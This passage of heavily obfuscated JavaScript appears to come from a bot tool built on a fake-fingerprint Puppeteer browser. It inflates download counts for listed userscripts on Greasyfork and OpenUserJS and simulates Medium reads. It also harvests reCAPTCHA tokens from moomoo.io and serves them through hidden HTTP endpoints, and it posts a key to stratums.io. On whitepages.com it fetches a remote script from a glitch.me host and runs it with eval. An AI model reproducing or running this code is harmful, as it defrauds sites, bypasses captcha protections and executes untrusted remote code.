    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x10) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + X(0x5) + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + Z(0x1b) + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1 * 0x1245 + -0x13d * -0x5 + 0xc14
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1557 + 0xd3 * 0x17 + -0xa13 * 0x4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1ecb + 0x2 * 0xe19 + -0x9 * -0x55), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xd * -0xb2 + 0xa * -0x377 + 0x2c14), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x245 * 0x5 + 0x9d * 0xf + -0x148c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1235 + -0x947 + 0x1b7c; w < getRandomInt(-0x205d + -0xb * 0x2f3 + 0x1 * 0x40cf, -0x1 * -0xa75 + -0x212 + -0x85e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x146f0 + -0x19063 + 0x133d3);
        }
      }();
    }, 0x259 * 0xe + 0x1d2 + -0x6dc * 0x5), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * 0xbe7 + -0x7 * 0xd + -0xb8c;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x89 * -0x1f + -0x2583 + 0x569 * 0xa, -0x4d * 0x75 + -0xc * 0x15d + 0x33bf)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const a0 = d;
          window[a0(0x12)]['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3b3c + 0x965 * 0xa + -0x23fe);
    }, 0xa76 + 0x1e60 + -0x3e * 0xa7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a1 = d;
        try {
          let s = -0x75 * -0x4e + -0x2559 + -0x5 * -0x57;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x6 * 0x35 + -0x18 * 0x19d + 0x3 * 0x113a), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x97 * -0x27 + 0x71b + 0xfe6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x5011a * 0x5 + 0xd176 + -0xc1b58);
        } catch (v) {}
        return await page['close'](), await context[a1(0x7)](), r();
      }());
    }, 0x6fc * 0x3 + 0x1 * 0x1fff + -0x348f);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x48b * -0x7 + -0x1ff6 + 0x408b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * 0x36cf + -0x2d23 + 0x15e4);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b,
    a5 = c;
  async function f() {
    const a4 = c,
      a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1997 + -0x2e * 0x7f + 0x306a) {
        const a2 = c;
        if (A['includes']('Firefox'))
          return A[a2(0x1a)](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x22f + -0x23f7 + -0x21c9 * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x18e9 + 0x28b + -0x1b74, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1c80 + 0x19a5 * -0x1 + 0x1 * 0x3625, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2e62 + -0xe87 + 0x63f9),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w[a3(0x17, 'D[Du')], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get'](a4(0xa) + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * -0x170d + 0xfd9 * -0x1 + 0x4df6),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + a5(0x4) + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      a6(0x0, 'Kv%2') + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + a6(0x8, '!IjU') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
